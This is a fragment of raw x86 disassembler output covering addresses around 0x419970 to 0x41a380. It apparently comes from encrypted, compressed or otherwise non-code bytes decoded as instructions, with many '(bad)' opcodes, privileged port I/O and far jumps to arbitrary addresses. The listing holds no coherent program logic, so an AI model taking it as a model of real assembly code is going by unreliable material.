  419970:	stos   DWORD PTR es:[edi],eax
  419971:	aam    0x67
  419973:	pop    ds
  419974:	call   DWORD PTR [ecx-0x7d]
  419977:	in     al,0xdd
  419979:	add    eax,0xe1693ccd
  41997e:	repz dec ebp
  419980:	sbb    al,0xa3
  419982:	xchg   esp,eax
  419983:	pop    edi
  419984:	adc    ebp,DWORD PTR [esi-0x3b767707]
  41998a:	daa    
  41998b:	call   0x24c7c151
  419990:	mov    esi,0x36656701
  419995:	xor    al,0x2c
  419997:	mov    dh,0xce
  419999:	aam    0xfd
  41999b:	add    al,0xf9
  41999d:	mov    al,ds:0x19c53f51
  4199a2:	mov    eax,0xcfed79c9
  4199a7:	mov    esi,DWORD PTR ds:0xffb441cc
  4199ad:	cmp    eax,0x47692f7d
  4199b2:	jmp    0x4199bd
  4199b4:	mov    ds:0xe4a1c50a,eax
  4199b9:	dec    ebp
  4199ba:	aas    
  4199bb:	cli    
  4199bc:	and    bh,bl
  4199be:	adc    al,BYTE PTR [ecx]
  4199c0:	aam    0x6d
  4199c2:	imul   BYTE PTR [eax+0x37ea7ef8]
  4199c8:	jle    0x419a18
  4199ca:	add    ebx,DWORD PTR [esi+0x47]
  4199cd:	push   esi
  4199ce:	test   al,0xec
  4199d0:	xchg   DWORD PTR [esi+0x2a],edx
  4199d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199d4:	cmp    al,0x7b
  4199d6:	xor    BYTE PTR [ebp+0x45],0xbf
  4199da:	xchg   ecx,eax
  4199db:	pop    edx
  4199dc:	push   ebx
  4199dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199de:	sub    eax,0xa33a3c72
  4199e3:	mov    al,ds:0xf6183e9d
  4199e8:	mov    bh,0xaf
  4199ea:	jbe    0x4199fb
  4199ec:	add    edx,DWORD PTR [eax+0x74]
  4199ef:	cmp    DWORD PTR [edx-0x4d],esp
  4199f2:	cmc    
  4199f3:	inc    esp
  4199f4:	bound  edi,QWORD PTR [eax+esi*1]
  4199f7:	sti    
  4199f8:	cmp    esi,DWORD PTR [esi-0x67]
  4199fb:	repnz cmp eax,ebx
  4199fe:	cdq    
  4199ff:	xor    dh,BYTE PTR [edi+0x3a]
  419a02:	pushf  
  419a03:	sub    DWORD PTR [eax+esi*8-0x30],ecx
  419a07:	jl     0x419a07
  419a09:	sub    bl,BYTE PTR [eax-0x59]
  419a0c:	pop    edx
  419a0d:	fsub   DWORD PTR [edx-0x35]
  419a10:	nop
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0x28c215d3
  419a81:	sti    
  419a82:	and    eax,0x1100d32
  419a87:	add    BYTE PTR ds:0x2a000001,al
  419a8d:	adc    edi,DWORD PTR [ecx]
  419a8f:	loopne 0x419a4b
  419a91:	dec    esp
  419a92:	jmp    0x419a81
  419a94:	(bad)  
  419a96:	retf   0x647
  419a99:	ret    0x472e
  419a9c:	inc    eax
  419a9d:	mov    ss,WORD PTR [esi+0x944c690]
  419aa3:	mov    ah,0x14
  419aa5:	ss je  0x419ad3
  419aa8:	outs   dx,DWORD PTR ds:[esi]
  419aa9:	mov    ds:0xcf963708,eax
  419aae:	mov    bh,0xeb
  419ab0:	(bad)  
  419ab1:	pusha  
  419ab2:	sbb    eax,0x4ade0d45
  419ab7:	jb     0x419af2
  419ab9:	push   es
  419aba:	rcl    ah,cl
  419abc:	mov    ?,ebx
  419abe:	mov    bl,0x5f
  419ac0:	test   al,0xa8
  419ac2:	dec    ecx
  419ac3:	xchg   esp,eax
  419ac4:	jmp    0xf7d5:0x5356cf71
  419acb:	mov    cl,0x25
  419acd:	repz push ebx
  419acf:	push   edi
  419ad0:	lods   al,BYTE PTR ds:[esi]
  419ad1:	pusha  
  419ad2:	in     eax,0x73
  419ad4:	inc    edx
  419ad5:	push   eax
  419ad6:	dec    edx
  419ad7:	xor    al,0xf5
  419ad9:	test   BYTE PTR [edi-0xf5474e3],bh
  419adf:	xor    al,0xd9
  419ae1:	cld    
  419ae2:	push   0xffffffab
  419ae4:	aad    0x56
  419ae6:	imul   esi,DWORD PTR [eax+edx*2-0x125fd279],0xffffffd3
  419aee:	clc    
  419aef:	adc    ebx,eax
  419af1:	or     eax,0xbd349fc3
  419af6:	jns    0x419ac1
  419af8:	sub    dl,dl
  419afa:	cs inc ebx
  419afc:	shl    DWORD PTR [edi-0x2e593a17],0x3e
  419b03:	sub    edi,DWORD PTR [ecx-0x7911f452]
  419b09:	out    dx,eax
  419b0a:	xor    al,0x7e
  419b0c:	lds    esi,FWORD PTR [esi+ebp*1+0x1c]
  419b10:	dec    esp
  419b11:	out    0xf2,eax
  419b13:	xor    eax,0x1b9bce90
  419b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b19:	jmp    0x7efa:0xc5545534
  419b20:	and    al,dh
  419b22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b23:	js     0x419ac0
  419b25:	adc    eax,0xaf0a38c2
  419b2a:	dec    eax
  419b2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b2c:	into   
  419b2d:	xor    eax,0xba3c446
  419b32:	neg    DWORD PTR [ecx]
  419b34:	pop    esp
  419b35:	sub    BYTE PTR [edx-0x38],0x49
  419b39:	je     0x419ad7
  419b3b:	push   edx
  419b3c:	fwait
  419b3d:	or     al,0x27
  419b3f:	dec    edi
  419b40:	pop    eax
  419b41:	mov    fs,WORD PTR [eax-0x6c]
  419b44:	inc    esi
  419b45:	dec    ebp
  419b46:	pop    ecx
  419b47:	into   
  419b48:	(bad)  
  419b49:	xor    eax,0x51a8faf1
  419b4e:	(bad)  
  419b50:	enter  0x5281,0x2e
  419b54:	mov    eax,ds:0x2a7f7d35
  419b59:	inc    edi
  419b5a:	data16 mov bh,0x51
  419b5d:	out    0x8b,eax
  419b5f:	fnstcw WORD PTR [eax-0x76]
  419b62:	out    0xc1,eax
  419b64:	fwait
  419b65:	adc    esi,DWORD PTR [esi+0x4b]
  419b68:	das    
  419b69:	xchg   DWORD PTR [ecx],eax
  419b6b:	mov    al,ds:0xa78b3977
  419b70:	test   al,0x1b
  419b72:	js     0x419b5d
  419b74:	cmp    al,0xe9
  419b76:	loopne 0x419b5c
  419b78:	mov    WORD PTR [eax+0x0],ss
  419b7b:	adc    al,BYTE PTR [esi]
  419b7d:	sbb    dh,BYTE PTR [edx+0x68]
  419b80:	rol    ecx,0x98
  419b83:	std    
  419b84:	stos   BYTE PTR es:[edi],al
  419b85:	xor    ebx,DWORD PTR [esi]
  419b87:	icebp  
  419b88:	in     eax,0x6f
  419b8a:	fild   WORD PTR [ecx-0x20]
  419b8d:	jl     0x419b9e
  419b8f:	add    eax,0xb8
	...
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x8a
  419c01:	cs pop edi
  419c03:	out    0x12,al
  419c05:	adc    DWORD PTR [ecx],eax
  419c07:	add    BYTE PTR ds:0x88000001,al
  419c0d:	add    DWORD PTR [esi+eiz*8],esp
  419c10:	fwait
  419c11:	mov    bl,0xe6
  419c13:	stos   BYTE PTR es:[edi],al
  419c14:	jg     0x419c35
  419c16:	inc    ebx
  419c17:	or     ebp,DWORD PTR [edi]
  419c19:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  419c1b:	mov    bl,bl
  419c1d:	pop    ecx
  419c1e:	dec    edi
  419c1f:	xor    edi,esi
  419c21:	mov    al,0x53
  419c23:	xor    al,0x99
  419c25:	sar    BYTE PTR [ebx],0x84
  419c28:	jl     0x419c51
  419c2a:	mov    ds:0x7dfc9d20,al
  419c2f:	dec    edx
  419c30:	pushf  
  419c31:	inc    eax
  419c32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c34:	std    
  419c35:	pushf  
  419c36:	xor    ebp,esp
  419c38:	and    al,0x76
  419c3a:	cli    
  419c3b:	inc    esi
  419c3c:	test   BYTE PTR [ebx+0x44],bl
  419c3f:	push   edi
  419c40:	repnz fsub QWORD PTR [edx]
  419c43:	sub    eax,0xfc7f3674
  419c48:	in     eax,dx
  419c49:	push   0xfffffffa
  419c4b:	int3   
  419c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c4d:	loop   0x419c73
  419c4f:	sbb    ah,BYTE PTR [ebp-0x7d76312a]
  419c55:	repnz or DWORD PTR [edi],esi
  419c58:	and    eax,0xb24ef354
  419c5d:	or     ebp,DWORD PTR [ebx]
  419c5f:	push   ds
  419c60:	add    BYTE PTR [esi],ch
  419c62:	retf   
  419c63:	push   ebx
  419c64:	add    eax,DWORD PTR [ebx-0xf9bc256]
  419c6a:	dec    esi
  419c6b:	aas    
  419c6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c6d:	inc    ebp
  419c6e:	int    0x3c
  419c70:	js     0x419c21
  419c72:	jae    0x419c36
  419c74:	dec    eax
  419c75:	mov    edi,0x865a5e6
  419c7a:	jmp    0xcbc9:0x6f2d4e66
  419c81:	pushf  
  419c82:	aas    
  419c83:	out    0xeb,eax
  419c85:	out    0x3f,eax
  419c87:	gs xchg edx,eax
  419c89:	inc    ebx
  419c8a:	fstp   st(2)
  419c8c:	jno    0x419c51
  419c8e:	mov    eax,0x30582201
  419c93:	ficom  WORD PTR [ebx-0x3c]
  419c96:	mov    ch,0xd3
  419c98:	sub    BYTE PTR [ebx-0x4b],ch
  419c9b:	mov    bl,0x87
  419c9d:	inc    ebx
  419c9e:	dec    ebx
  419c9f:	jecxz  0x419c3d
  419ca1:	clc    
  419ca2:	sub    esp,ecx
  419ca4:	push   ebp
  419ca5:	aam    0x6d
  419ca7:	(bad)  
  419ca8:	mov    es,WORD PTR [edx+0x5d]
  419cab:	sub    BYTE PTR [eax+0x66d989cf],ch
  419cb1:	std    
  419cb2:	clc    
  419cb3:	hlt    
  419cb4:	xor    BYTE PTR [edi],ch
  419cb6:	rol    DWORD PTR [edx-0x60d5172b],cl
  419cbc:	daa    
  419cbd:	inc    esp
  419cbe:	push   esi
  419cbf:	sub    al,0x1b
  419cc1:	cmp    ah,0x31
  419cc4:	frstor [edx+ecx*2-0x77]
  419cc8:	inc    eax
  419cc9:	enter  0xeab9,0x79
  419ccd:	or     edx,DWORD PTR [ebx]
  419ccf:	or     DWORD PTR [edi+0x73],edx
  419cd2:	sahf   
  419cd3:	or     BYTE PTR [ecx],al
  419cd5:	adc    eax,0xf0490cc1
  419cda:	les    ebp,FWORD PTR [ecx-0x54f9a363]
  419ce0:	and    edx,edx
  419ce2:	jge    0x419d57
  419ce4:	ret    
  419ce5:	addr16 dec edx
  419ce7:	fs push edx
  419ce9:	pusha  
  419cea:	pop    edi
  419ceb:	cs push eax
  419ced:	clc    
  419cee:	xor    bh,BYTE PTR [edi]
  419cf0:	call   0xa26b7072
  419cf5:	add    edi,DWORD PTR [eax+0x44]
  419cf8:	add    al,0xe5
  419cfa:	ror    BYTE PTR [edi+ecx*1],cl
  419cfd:	add    eax,0xb129d093
  419d02:	cmp    bl,al
  419d04:	cmp    ah,bl
  419d06:	sub    DWORD PTR [eax-0x507276cd],0xb5324197
  419d10:	out    dx,eax
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	fimul  DWORD PTR ss:[esi]
  419d81:	aam    0x7d
  419d83:	cmp    DWORD PTR [edi],edx
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0x13000001,al
  419d8d:	add    eax,0x2388b799
  419d92:	xchg   ebx,eax
  419d93:	int3   
  419d94:	and    ecx,DWORD PTR [eax]
  419d96:	bsf    eax,DWORD PTR ds:0xfae7b86b
  419d9d:	mov    ebp,0x42b17da1
  419da2:	or     ah,cl
  419da4:	sbb    eax,0xbd176aa
  419da9:	(bad)  
  419dab:	xor    eax,DWORD PTR [eax-0x2a4200b8]
  419db1:	xchg   ebp,eax
  419db2:	call   FWORD PTR [ebx-0xe]
  419db5:	cwde   
  419db6:	jmp    0xca983a15
  419dbb:	add    ebx,esi
  419dbd:	jg     0x419d6c
  419dbf:	or     DWORD PTR [ebp+0x9],edx
  419dc2:	jne    0x419e11
  419dc4:	pop    ebp
  419dc5:	xor    bl,BYTE PTR [edi-0x5e7df9ea]
  419dcb:	(bad)  
  419dcc:	fild   QWORD PTR [ebx+0x3a]
  419dcf:	or     eax,DWORD PTR [ebp-0x20]
  419dd2:	(bad)  
  419dd4:	icebp  
  419dd5:	push   ds
  419dd6:	dec    ebp
  419dd7:	jp     0x419e02
  419dd9:	pop    ebx
  419dda:	into   
  419ddb:	mov    gs,ebp
  419ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dde:	or     eax,0x2a5aec1
  419de3:	adc    ebx,eax
  419de5:	or     eax,0xf5a241ad
  419dea:	sar    BYTE PTR [ecx-0x4c],1
  419ded:	adc    al,0x87
  419def:	fwait
  419df0:	popa   
  419df1:	test   eax,0x8f62d809
  419df6:	rol    DWORD PTR ds:0x8b3ae85,cl
  419dfc:	sub    eax,0xc6ae9427
  419e01:	jae    0x419e7a
  419e03:	mov    cl,0xd7
  419e05:	cli    
  419e06:	(bad)  
  419e08:	mov    bl,0x48
  419e0a:	and    dh,BYTE PTR [ebx-0x154afb85]
  419e10:	test   BYTE PTR [ecx+edx*8-0x28],al
  419e14:	(bad)  
  419e15:	mov    al,0xa8
  419e17:	vxorpd xmm3,xmm7,XMMWORD PTR [eax-0x31]
  419e1c:	mov    DWORD PTR [eax-0x1a],edx
  419e1f:	sbb    esp,DWORD PTR [eax-0x5d]
  419e22:	out    0x3f,eax
  419e24:	adc    eax,0xbe014b87
  419e29:	mov    eax,ds:0xb551fe8f
  419e2e:	jp     0x419e13
  419e30:	fs xchg esp,eax
  419e32:	push   ss
  419e33:	sub    al,0xa4
  419e35:	or     al,0xe3
  419e37:	adc    al,0xed
  419e39:	dec    esp
  419e3a:	inc    DWORD PTR [ebp+0x1ebae35b]
  419e40:	call   0x54d3:0x6c4b4733
  419e47:	das    
  419e48:	cmp    esp,DWORD PTR [edi]
  419e4a:	fcmovnu st,st(4)
  419e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e4d:	add    ecx,eax
  419e4f:	test   DWORD PTR [ecx-0xb02e7ee],0xc48f9c
  419e59:	std    
  419e5a:	sub    ebp,esi
  419e5c:	mov    eax,ds:0xa554d7b3
  419e61:	in     al,0xb8
  419e63:	mov    al,ds:0xd8631139
  419e68:	fdivr  QWORD PTR [ebx-0x1ea0dd5f]
  419e6e:	push   eax
  419e6f:	xchg   DWORD PTR [ebx+0x30267e43],esi
  419e75:	loopne 0x419eaf
  419e77:	push   ss
  419e78:	adc    eax,0xe3ac417b
  419e7d:	and    dh,dl
  419e7f:	aam    0x83
  419e81:	inc    esp
  419e82:	(bad)  
  419e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e85:	mov    ss,edi
  419e87:	aad    0x2b
  419e89:	pop    eax
  419e8a:	dec    ebp
  419e8b:	test   al,0xbb
  419e8d:	dec    eax
  419e8e:	add    ebp,DWORD PTR [eax-0x6]
	...
  419ef1:	add    BYTE PTR [eax],al
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	and    ecx,esp
  419f02:	dec    esi
  419f03:	pop    es
  419f04:	sbb    al,0x13
  419f06:	add    DWORD PTR [eax],eax
  419f08:	add    eax,0xee000001
  419f0d:	popa   
  419f0e:	inc    esi
  419f0f:	test   esp,0x13c5a86
  419f15:	push   ebp
  419f16:	mov    WORD PTR [ecx],?
  419f18:	scas   eax,DWORD PTR es:[edi]
  419f19:	mov    edi,0x6b9ab064
  419f1e:	mov    cl,0xe0
  419f20:	push   eax
  419f21:	mov    ebx,0x4771e979
  419f26:	inc    esi
  419f27:	call   0x5139:0xaf72155a
  419f2e:	jae    0x419f05
  419f30:	imul   edi,DWORD PTR [eax+0x68],0x5
  419f34:	or     al,0xfd
  419f36:	xor    eax,eax
  419f38:	and    dl,BYTE PTR [esp+ebp*8+0x48e2450f]
  419f3f:	fidiv  WORD PTR [ecx+0x7751cf81]
  419f45:	stc    
  419f46:	pop    edi
  419f47:	sub    dh,BYTE PTR [ecx+0x4d]
  419f4a:	fdivrp st(1),st
  419f4c:	fcom   QWORD PTR ds:0x480355a8
  419f52:	push   ss
  419f53:	pop    esp
  419f54:	mov    esi,0xd7643507
  419f59:	jnp    0x419f33
  419f5b:	ja     0x419f09
  419f5d:	adc    BYTE PTR [eax],cl
  419f5f:	pop    esp
  419f60:	stos   BYTE PTR es:[edi],al
  419f61:	out    dx,al
  419f62:	xchg   ecx,eax
  419f63:	les    eax,FWORD PTR [edx]
  419f65:	cmp    DWORD PTR [edi],eax
  419f67:	or     DWORD PTR [ebx+0x669c54db],esp
  419f6d:	sbb    bx,bp
  419f70:	int    0xe
  419f72:	jb     0x419f2b
  419f74:	cmp    bh,BYTE PTR [esi]
  419f76:	mov    al,ds:0x41f0d4b
  419f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f7c:	or     DWORD PTR [ebp-0x1bd8e68f],ebx
  419f82:	cmp    edi,DWORD PTR [edx]
  419f84:	pop    edx
  419f85:	addr16 mov ds:0x755a,al
  419f89:	fsubr  DWORD PTR fs:[edi+0x5580d9fd]
  419f90:	ja     0x419f8b
  419f92:	jecxz  0x419fd2
  419f94:	cmp    cl,BYTE PTR [esi-0x7a]
  419f97:	sahf   
  419f98:	sub    eax,0xf6fe90cb
  419f9d:	ins    BYTE PTR es:[edi],dx
  419f9e:	push   edx
  419f9f:	lds    ebp,FWORD PTR fs:0xbac9245b
  419fa6:	sub    ecx,DWORD PTR [edx]
  419fa8:	push   DWORD PTR [edx-0x7ecbdca0]
  419fae:	(bad)  
  419faf:	mov    ecx,0xebeee1a3
  419fb4:	fist   WORD PTR [edi+0x2924aeea]
  419fba:	xchg   DWORD PTR [ebp-0x5d1f63c],ebp
  419fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fc1:	cmp    al,0xab
  419fc3:	push   ds
  419fc4:	cdq    
  419fc5:	xchg   esi,eax
  419fc6:	ret    
  419fc7:	mov    ecx,ds
  419fc9:	push   es
  419fca:	dec    ecx
  419fcb:	(bad)  
  419fcc:	aam    0x6e
  419fce:	xchg   edx,eax
  419fcf:	aad    0xa7
  419fd1:	adc    eax,0xa22b77
  419fd6:	add    BYTE PTR ds:0x81e4d7d9,0x73
  419fdd:	leave  
  419fde:	mov    al,ds:0x8c829b10
  419fe3:	hlt    
  419fe4:	adc    ch,BYTE PTR [ecx-0x68]
  419fe7:	sbb    al,0x52
  419fe9:	not    bl
  419feb:	jp     0x41a044
  419fed:	sub    ebx,DWORD PTR [edx-0x1c]
  419ff0:	test   BYTE PTR [ecx+0x29],al
  419ff3:	inc    ebp
  419ff4:	ss sub al,ch
  419ff7:	mov    BYTE PTR [ecx],ch
  419ff9:	es inc eax
  419ffb:	and    al,0x22
  419ffd:	stos   DWORD PTR es:[edi],eax
  419ffe:	lahf   
  419fff:	cmp    al,0xa
  41a001:	xchg   edx,eax
  41a002:	mov    al,0xc
  41a004:	arpl   WORD PTR [esi+0x34],sp
  41a007:	push   eax
  41a008:	xchg   edx,eax
  41a009:	xchg   DWORD PTR [edx],ebp
  41a00b:	xchg   edi,eax
  41a00c:	fdivr  st(4),st
  41a00e:	mov    ebp,0x393f
	...
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax-0x5a],bh
  41a081:	fild   DWORD PTR [ebx]
  41a083:	and    esp,DWORD PTR [ecx]
  41a085:	adc    al,0x1
  41a087:	add    BYTE PTR ds:0x6000001,al
  41a08d:	lods   eax,DWORD PTR ds:[esi]
  41a08e:	push   edi
  41a08f:	add    al,0x70
  41a091:	(bad)  ds:0x65d1aa9c
  41a097:	xor    ah,cl
  41a099:	cdq    
  41a09a:	clc    
  41a09b:	mov    edx,0xd128afbe
  41a0a0:	pop    esp
  41a0a1:	jl     0x41a036
  41a0a3:	mov    eax,0x38fd110
  41a0a8:	shl    bl,1
  41a0aa:	test   eax,0xf839e3df
  41a0af:	or     BYTE PTR [esi+eiz*4-0x184fb4ca],bh
  41a0b6:	pop    ss
  41a0b7:	clc    
  41a0b8:	or     ch,cl
  41a0ba:	inc    ebx
  41a0bb:	rol    BYTE PTR [edx],0x99
  41a0be:	jmp    0xf19f:0xc98fb3d
  41a0c5:	and    eax,esp
  41a0c7:	mov    bh,0x18
  41a0c9:	fwait
  41a0ca:	loopne 0x41a149
  41a0cc:	js     0x41a06b
  41a0ce:	je     0x41a06f
  41a0d0:	push   edx
  41a0d1:	pushf  
  41a0d2:	clc    
  41a0d3:	js     0x41a139
  41a0d5:	xchg   edi,eax
  41a0d6:	cdq    
  41a0d7:	cmp    eax,0xc4db01c
  41a0dc:	and    edi,DWORD PTR [esi]
  41a0de:	stos   DWORD PTR es:[edi],eax
  41a0df:	mov    dl,0x67
  41a0e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0e2:	sbb    ecx,esi
  41a0e4:	cmp    al,0x63
  41a0e6:	aas    
  41a0e7:	adc    DWORD PTR [esi],edi
  41a0e9:	gs loop 0x41a166
  41a0ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0ed:	lods   al,BYTE PTR ds:[esi]
  41a0ee:	or     eax,0x97687ea7
  41a0f3:	dec    eax
  41a0f4:	pop    ecx
  41a0f5:	aad    0x6
  41a0f7:	repz rcr BYTE PTR [eax+ebp*2+0x4abccecb],cl
  41a0ff:	push   esi
  41a100:	fldz   
  41a102:	shl    DWORD PTR [ebp+0x18],0x87
  41a106:	(bad)  
  41a107:	cdq    
  41a108:	add    dh,bl
  41a10a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a10b:	cwde   
  41a10c:	sbb    eax,ecx
  41a10e:	add    bh,BYTE PTR [ebx+0x2d35635c]
  41a114:	lods   al,BYTE PTR ds:[esi]
  41a115:	stos   BYTE PTR es:[edi],al
  41a116:	pushf  
  41a117:	inc    esi
  41a118:	dec    ebx
  41a119:	jl     0x41a0d8
  41a11b:	mov    ds:0xf6b6247e,al
  41a120:	push   edx
  41a121:	sar    DWORD PTR [esi-0x6d],1
  41a124:	xchg   esp,eax
  41a125:	xchg   edx,eax
  41a126:	push   ebx
  41a127:	mov    ds:0x66da5306,eax
  41a12c:	int    0xd8
  41a12e:	aam    0xcb
  41a130:	jp     0x41a1aa
  41a132:	mov    bh,0x76
  41a134:	pushf  
  41a135:	std    
  41a136:	repnz lods eax,DWORD PTR ds:[esi]
  41a138:	and    al,0x56
  41a13a:	xlat   BYTE PTR ds:[ebx]
  41a13b:	cli    
  41a13c:	enter  0xc29c,0x86
  41a140:	and    bl,BYTE PTR [ebp-0x1d]
  41a143:	shr    DWORD PTR [edi-0x15],cl
  41a146:	adc    DWORD PTR [ecx+0x2f],esp
  41a149:	outs   dx,DWORD PTR ds:[esi]
  41a14a:	inc    ebx
  41a14b:	jle    0x41a169
  41a14d:	mov    ecx,0xca2e7d68
  41a152:	cmp    BYTE PTR es:[esi+0x336c41c8],dh
  41a159:	pop    edx
  41a15a:	mov    ds:0xb16c1c9b,al
  41a15f:	xchg   edx,eax
  41a160:	cwde   
  41a161:	xor    esp,esi
  41a163:	jge    0x41a1df
  41a165:	hlt    
  41a166:	sbb    al,0xd0
  41a168:	inc    eax
  41a169:	pop    es
  41a16a:	test   al,0xb7
  41a16c:	rol    ebp,1
  41a16e:	cmp    eax,0x18de2896
  41a173:	inc    esi
  41a174:	aaa    
  41a175:	pop    edx
  41a176:	and    ah,ah
  41a178:	pop    esp
  41a179:	iret   
  41a17a:	retf   0x2bff
  41a17d:	jle    0x41a116
  41a17f:	cmp    ch,ah
  41a181:	lock adc DWORD PTR [edx+0x6],ebp
  41a185:	cmp    BYTE PTR [edi-0x46],0x75
  41a189:	loopne 0x41a1ec
  41a18b:	xor    DWORD PTR [edx+0x62ac6874],0x0
	...
  41a1f2:	add    BYTE PTR [eax],al
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	mov    cl,0x89
  41a202:	call   0x156c8d9
  41a207:	add    BYTE PTR ds:0x85000001,al
  41a20d:	sub    al,0xdd
  41a20f:	pavgb  mm3,QWORD PTR [esi+0x291fec27]
  41a216:	imul   ebp,DWORD PTR [eax],0xffffffab
  41a219:	mov    bl,0xea
  41a21b:	dec    ebp
  41a21c:	fdiv   QWORD PTR [ecx+0x204c6c]
  41a222:	inc    eax
  41a223:	and    eax,DWORD PTR [esi]
  41a225:	jns    0x41a216
  41a227:	aad    0xce
  41a229:	ds inc ecx
  41a22b:	out    0x74,eax
  41a22d:	jl     0x41a1e5
  41a22f:	mov    dl,BYTE PTR [ebx+0x2cdd745e]
  41a235:	dec    ebp
  41a236:	ins    BYTE PTR es:[edi],dx
  41a237:	repnz fdivr st,st(7)
  41a23a:	pop    esi
  41a23b:	sub    eax,0x42073dc1
  41a240:	xchg   esp,eax
  41a241:	sub    eax,0x6ceb5ce0
  41a246:	xchg   edx,eax
  41a247:	outs   dx,BYTE PTR ds:[esi]
  41a248:	adc    DWORD PTR [ebp-0x7],ecx
  41a24b:	retf   
  41a24c:	and    DWORD PTR [esi],edi
  41a24e:	popf   
  41a24f:	xchg   ebx,eax
  41a250:	fld    DWORD PTR [ebx]
  41a252:	mov    cl,0x41
  41a254:	in     eax,dx
  41a255:	sub    eax,0x28fc7b4d
  41a25a:	sbb    eax,0xaf6166cd
  41a25f:	push   ebx
  41a260:	cwde   
  41a261:	cwde   
  41a262:	cli    
  41a263:	or     eax,0x32a6a415
  41a268:	xor    eax,0xaaafcdc1
  41a26d:	lea    eax,[esi+0xb]
  41a270:	into   
  41a271:	cmp    dh,BYTE PTR [ebx]
  41a273:	mov    dh,0x2e
  41a275:	bound  edx,QWORD PTR [edx]
  41a277:	lock sti 
  41a279:	sub    edx,DWORD PTR [edx]
  41a27b:	and    eax,0x38335473
  41a280:	test   al,0x43
  41a282:	std    
  41a283:	sbb    al,0x50
  41a285:	jecxz  0x41a20e
  41a287:	sub    bh,bh
  41a289:	fdivr  st(1),st
  41a28b:	jmp    0x5c05cd63
  41a290:	push   0xffffff8b
  41a292:	sbb    BYTE PTR [edx-0x3831939c],bh
  41a298:	pop    ss
  41a299:	dec    ebp
  41a29a:	jmp    0xb468:0xab301659
  41a2a1:	xlat   BYTE PTR ds:[ebx]
  41a2a2:	aam    0x1d
  41a2a4:	mov    ch,0xbc
  41a2a6:	repz mov bh,0xe3
  41a2a9:	cld    
  41a2aa:	rcr    BYTE PTR [esp+edi*2+0x757e454e],1
  41a2b1:	repz iret 
  41a2b3:	sbb    al,0x6
  41a2b5:	fs aaa 
  41a2b7:	mov    bh,0x6d
  41a2b9:	jecxz  0x41a331
  41a2bb:	push   cs
  41a2bc:	jnp    0x41a291
  41a2be:	das    
  41a2bf:	xor    bl,BYTE PTR [edx+0x17]
  41a2c2:	lock scas eax,DWORD PTR es:[edi]
  41a2c4:	or     BYTE PTR [ebp-0x13],bl
  41a2c7:	mov    esp,0x41c91f05
  41a2cc:	ret    
  41a2cd:	cmp    eax,0x5eafe1ca
  41a2d2:	mov    dl,0x67
  41a2d4:	mov    esp,DWORD PTR [edx]
  41a2d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2d7:	bound  ebp,QWORD PTR [ebx]
  41a2d9:	dec    eax
  41a2da:	pop    ds
  41a2db:	rol    BYTE PTR [edi],0x97
  41a2de:	sbb    ecx,DWORD PTR [edi-0x5d]
  41a2e1:	(bad)  
  41a2e2:	pop    eax
  41a2e3:	ret    0xc75b
  41a2e6:	mov    ebx,0x540b2d7e
  41a2eb:	test   DWORD PTR [edi],ebx
  41a2ed:	in     eax,dx
  41a2ee:	(bad)  
  41a2ef:	xchg   ebp,eax
  41a2f0:	or     eax,0x9a8fea6
  41a2f5:	mov    ebx,0xae59de50
  41a2fa:	mov    BYTE PTR ds:0x96a998dc,bh
  41a300:	mov    ds:0x94e578ac,al
  41a305:	rcr    ecx,1
  41a307:	test   al,0xde
  41a309:	sub    dl,BYTE PTR [bp+di-0x5e8b]
  41a30e:	sbb    al,0xc8
  41a310:	bound  eax,QWORD PTR [eax]
	...
  41a372:	add    BYTE PTR [eax],al
  41a374:	neg    DWORD PTR [eax-0x58]
  41a377:	adc    ebp,DWORD PTR [edi+0x15fcfff3]
  41a37d:	pop    esp
  41a37e:	xchg   ebp,eax
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	xor    BYTE PTR [edx+ebp*8-0x7e],dl
